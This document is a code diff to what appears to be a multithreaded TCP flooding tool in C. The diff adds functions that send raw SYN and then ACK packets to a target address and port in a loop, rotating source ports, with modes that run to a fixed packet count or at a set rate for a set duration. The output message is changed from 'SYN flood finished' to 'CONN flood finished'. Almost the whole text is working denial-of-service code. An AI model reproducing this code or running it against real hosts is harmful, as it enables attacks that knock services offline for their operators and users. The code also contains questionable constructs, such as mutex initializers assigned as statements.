@@ -22,12 +22,15 @@ short conn_timed_finisher;
 short conn_receiver_count;
 short* conn_receiving_flag;
 
+clock_t conn_global_time;
 
-pthread_mutex_t conn_mutex = PTHREAD_MUTEX_INITIALIZER;
-pthread_cond_t conn_cond = PTHREAD_COND_INITIALIZER;
+pthread_mutex_t conn_mutex;
+pthread_cond_t conn_cond;
 
 pthread_mutex_t *conn_recv_mutex;
 pthread_cond_t *conn_recv_cond;
+
+
 
 struct recv *conn_recvd;
 __u32 *conn_syn_seq;
@@ -43,54 +46,47 @@ void conn_flood_print_usage(int mode) {
 
 void* generate_conn_flooding1(void *data) {
 	int thread_id = *((int*) data);
-	int sock = make_socket(IPPROTO_TCP);
-	/*	while (1) {
+	clock_t thread_clock;
+		while (1) {
 
-		struct iphdr ipv4_h;
-		ipv4_h = prepare_empty_ipv4();
-		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));
-*/
-		/*** If you want to modify ip address*/
-		//next_ip_addr(tcpsyn_src_ip, 1);
-/*	ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));
+		pthread_mutex_lock(&conn_mutex);
+		thread_clock = clock();
 
-		struct tcphdr tcp_h;
-		tcp_h = prepare_empty_tcp();
-		tcp_h = tcp_set_source(tcp_h, tcpsyn_src_port);
-		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
-		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);
+		int sock = make_socket(IPPROTO_TCP);
 
-		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
-		/***For SYN TCP request, ACK seq should not be provided.*/
-/*
-		tcp_h = tcp_set_syn_flag(tcp_h);
-
-		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);
-
-		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
-		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
-
-		printf("%d\n", ((struct iphdr*) packet)->tot_len);
-
-		pthread_mutex_lock(&tcpsyn_mutex);
-
-		if (tcpsyn_produced >= tcpsyn_total) {
-			pthread_mutex_unlock(&tcpsyn_mutex);
-			pthread_cond_broadcast(&tcpsyn_cond);
+		if (conn_generated_count >= conn_total) {
+			pthread_mutex_unlock(&conn_mutex);
+			pthread_cond_broadcast(&conn_cond);
 			return 0;
 		}
 
-		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
-		tcpsyn_generated_count++;
-		free(packet);
-		tcpsyn_produced++;
+		int seq = (int)(rand()%__UINT_MAXIMUM__);
+		int syn_ack_seq =  (int)(rand()%__UINT_MAXIMUM__);
 
-		pthread_mutex_unlock(&tcpsyn_mutex);
+		tcp_send_syn(sock,seq,inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
+				conn_src_port, conn_dest_port);
+
+		int orig_port = conn_src_port;
+
+		conn_src_port++;
+
+		int waited_duration = ((double) (conn_global_time - thread_clock)) / CLOCKS_PER_SEC;
+			if(waited_duration < __MINIMUM_RESPONSE_WAIT_TIME__)
+				pthread_cond_wait(&conn_cond, &conn_mutex);
+
+		tcp_send_ack(sock,seq,syn_ack_seq,inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
+				orig_port, conn_dest_port);
+
+
+		conn_generated_count++;
+
+		close(sock);
+		pthread_cond_signal(&conn_cond);
+		pthread_mutex_unlock(&conn_mutex);
 	}
-	close(sock);
+
 	return 0;
-	*/
+
 }
 void* generate_conn_flooding2(void *data) {
 	int thread_id = *((int*) data);
@@ -122,6 +118,7 @@ void* generate_conn_flooding2(void *data) {
 	//close(sock);
 	return 0;
 }
+
 void* generate_conn_flooding3(void *data) {
 	int thread_id = *((int*) data);
 	int sock = make_socket(IPPROTO_TCP);
@@ -215,7 +212,64 @@ void* generate_conn_flooding3(void *data) {
 	close(sock);
 	return 0;
 }
+void* generate_conn_flooding4(void *data) {
+	int thread_id = *((int*) data);
+	clock_t thread_clock;
+	while (1) {
 
+
+
+		pthread_mutex_lock(&conn_mutex);
+		thread_clock = clock();
+
+
+		int sock = make_socket(IPPROTO_TCP);
+
+
+		if (conn_elapsed_time >= conn_duration) {
+			pthread_mutex_unlock(&conn_mutex);
+			pthread_cond_broadcast(&conn_cond);
+			conn_timed_finisher=1;
+			return 0;
+		}
+
+		if (conn_produced >= conn_per_second) {
+			pthread_cond_wait(&conn_cond, &conn_mutex);
+		}
+
+
+		int seq = (int)(rand()%__UINT_MAXIMUM__);
+		int syn_ack_seq =  (int)(rand()%__UINT_MAXIMUM__);
+
+		tcp_send_syn(sock,seq,inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
+				conn_src_port, conn_dest_port);
+
+		int orig_port = conn_src_port;
+
+		conn_src_port++;
+		int waited_duration = ((double) (conn_global_time - thread_clock)) / CLOCKS_PER_SEC;
+		if(waited_duration < __MINIMUM_RESPONSE_WAIT_TIME__)
+			pthread_cond_wait(&conn_cond, &conn_mutex);
+
+
+
+		tcp_send_ack(sock,seq,syn_ack_seq,inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
+				orig_port, conn_dest_port);
+
+		conn_produced++;
+		conn_total++;
+		conn_generated_count++;
+
+
+		//conn_dest_port++;
+
+		close(sock);
+		pthread_cond_signal(&conn_cond);
+		pthread_mutex_unlock(&conn_mutex);
+
+	}
+	return 0;
+}
 
 void* conn_time_check(void *data) {
 	int thread_id = *((int*) data);
@@ -226,6 +280,10 @@ void* conn_time_check(void *data) {
 
 	while (1) {
 		pthread_mutex_lock(&conn_mutex);
+
+		conn_global_time =  clock();
+		conn_elapsed_time = ((double) (conn_global_time - elapsed_time))
+							/ CLOCKS_PER_SEC;
 		if(conn_timed_finisher==1) return 0;
 		t2 = clock();
 		time_taken = ((double) (t2 - t1)) / CLOCKS_PER_SEC;
@@ -316,6 +374,8 @@ void conn_flood_run(char *argv[], int mode) {
 
 	strcpy(conn_src_ip, argv[0]);
 
+	conn_mutex = PTHREAD_MUTEX_INITIALIZER;
+	conn_cond = PTHREAD_COND_INITIALIZER;
 	conn_produced = 0;
 	if (mode == 1) {
 		conn_total = atoi(argv[3]);
@@ -374,7 +434,8 @@ void conn_flood_run(char *argv[], int mode) {
 					(void*) &generate_thread_id[i]);
 		if (mode == 2)
 		{
-			pthread_create(&generate_thread[i], NULL, generate_conn_flooding2,
+			printf("thread %d created\n",i);
+			pthread_create(&generate_thread[i], NULL, generate_conn_flooding4,
 								(void*) &generate_thread_id[i]);
 			/*RECEIVE THREAD DEACTIVATION*/
 			//pthread_create(&receive_thread[i],NULL,receive_conn,(void*)&receive_thread_id[i]);
@@ -382,11 +443,10 @@ void conn_flood_run(char *argv[], int mode) {
 
 	}
 
-	if (mode == 2) {
 		pthread_create(&generate_thread[i], NULL, conn_time_check,
 				(void*) &generate_thread_id[i]);
 		num_threads++;
-	}
+
 
 	for (i = 0; i < num_threads; i++) {
 		void *status1,*status2;
@@ -396,7 +456,7 @@ void conn_flood_run(char *argv[], int mode) {
 		printf("threads %d joined\n", i);
 	}
 
-	printf("SYN flood finished\nTotal %d packets sent.\n",conn_generated_count);
+	printf("CONN flood finished\nTotal %d packets sent.\n",conn_generated_count);
 
 	pthread_mutex_destroy(&conn_mutex);
 	pthread_exit(NULL);
@@ -411,4 +471,3 @@ void conn_flood_run(char *argv[], int mode) {
 	free(conn_syn_seq);
 	return;
 }
-
